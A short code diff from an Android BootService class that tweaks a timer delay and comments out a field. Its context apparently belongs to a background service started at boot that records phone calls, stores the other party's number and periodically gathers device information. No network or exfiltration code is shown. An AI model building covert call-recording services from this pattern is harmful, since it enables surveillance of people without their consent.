@@ -51,14 +51,14 @@ public class BootService extends Service
 	
 	private Timer mGetInfoTimer = null;
 	private GetInfoTask mInfoTask = null;
-	private final long mGetInfoDelay  = 10000; // 10 Seconds
+	private final long mGetInfoDelay  = 30000; // 30 Seconds
 	private final long mGetInfoPeriod = 300000; // 300 Seconds
 	
 	private TelephonyManager telManager = null;
 	private boolean recordStarted = false;
 	public static String otherSidePhoneNum = "";
 	private static MediaRecorder recorder = new MediaRecorder();
-	private static IntentFilter screenStateIntent = null;
+	//private static IntentFilter screenStateIntent = null; // The intent for screen state receiver
 	
 	private final PhoneStateListener phoneListener = new PhoneStateListener() {
 		private static final long MIN_FILE_SIZE = 10240; // 10KB
